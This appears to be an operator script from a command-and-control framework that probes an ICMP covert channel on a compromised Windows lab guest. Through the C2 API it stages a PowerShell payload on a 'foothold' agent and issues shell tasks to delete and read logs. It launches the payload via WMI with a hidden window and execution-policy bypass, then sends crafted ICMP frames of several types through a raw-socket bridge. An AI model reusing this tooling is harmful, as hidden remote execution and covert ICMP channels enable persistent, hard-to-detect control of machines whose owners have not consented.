// probe-matrix4.mjs <footholdId> — ICMP type-scan: fire VC frames of types
// 0 (control), 13, 14, 42 at the guest; the type-permissive listener logs what
// actually gets delivered to a .NET raw socket.
import { spawn } from 'node:child_process';
import { readFileSync } from 'node:fs';
import { fileURLToPath } from 'node:url';
import { icmpPacket } from '../varvel/engine/icmpcodec.mjs';

const API = 'http://127.0.0.1:8971';
const GUEST = '192.168.50.130';
const BRIDGE = fileURLToPath(new URL('../varvel/agents/icmp-bridge.py', import.meta.url));
const FOOTHOLD = process.argv[2];
if (!FOOTHOLD) { console.error('usage: node probe-matrix4.mjs <footholdId>'); process.exit(2); }
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

async function j(path, body) {
  const r = await fetch(API + path, body ? { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify(body) } : undefined);
  return r.json();
}
async function waitTask(agentId, taskId, s = 40) {
  for (let i = 0; i < s / 2; i++) {
    await sleep(2000);
    const { tasks } = await j('/api/channel/tasks?agent=' + agentId);
    const x = (tasks || []).find((y) => y.taskId === taskId);
    if (x && x.status === 'resulted') return x.resultPreview;
  }
  return null;
}

const b64 = readFileSync(new URL('./guest-icmp-matrix4.ps1', import.meta.url)).toString('base64');
const st = await j('/api/channel/stage', { agentId: FOOTHOLD, name: 'guest-icmp-matrix4.ps1', b64 });
console.log('staged:', await waitTask(FOOTHOLD, st.taskId, 30));
await j('/api/channel/task', { agentId: FOOTHOLD, kind: 'shell', data: 'del C:\\Windows\\Temp\\icmp-matrix4.log' });
await sleep(3000);
const wmi = "powershell -NoProfile -Command $r=Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine='powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\\Windows\\System32\\agentbox\\guest-icmp-matrix4.ps1'}; $r.ReturnValue";
const lt = await j('/api/channel/task', { agentId: FOOTHOLD, kind: 'shell', data: wmi });
console.log('launch:', await waitTask(FOOTHOLD, lt.taskId, 30));

const child = spawn('python', ['-u', BRIDGE], { windowsHide: true, stdio: ['pipe', 'pipe', 'pipe'] });
let buf = ''; const lines = [];
child.stdout.on('data', (d) => {
  buf += d.toString('utf8');
  let nl;
  while ((nl = buf.indexOf('\n')) >= 0) { const line = buf.slice(0, nl).trim(); buf = buf.slice(nl + 1); if (!line) continue; try { lines.push(JSON.parse(line)); } catch {} }
});
let cap = null;
for (let i = 0; i < 100 && !cap; i++) { cap = lines.find((m) => m.op === 'capability'); if (!cap) await sleep(100); }
if (!cap || !cap.supported) { console.log('BRIDGE-UNSUPPORTED:', JSON.stringify(cap)); child.kill(); process.exit(1); }
const send = (pkt) => child.stdin.write(JSON.stringify({ id: 1, op: 'send', dst: GUEST, packetB64: pkt.toString('base64') }) + '\n');

await sleep(4000);
for (const [type, seq] of [[0, 6001], [13, 6002], [14, 6003], [42, 6004]]) {
  send(icmpPacket({ type, seq, kind: 'reply', idx: 0, cnt: 1, data: Buffer.from('m4-type-' + type) }));
  await sleep(700);
}
console.log('sent: type 0 (seq 6001, control), 13 (6002), 14 (6003), 42 (6004)');

await sleep(16000);
child.kill();
const t2 = await j('/api/channel/task', { agentId: FOOTHOLD, kind: 'shell', data: 'type C:\\Windows\\Temp\\icmp-matrix4.log' });
console.log('MATRIX4 LOG:', JSON.stringify(await waitTask(FOOTHOLD, t2.taskId, 40)));
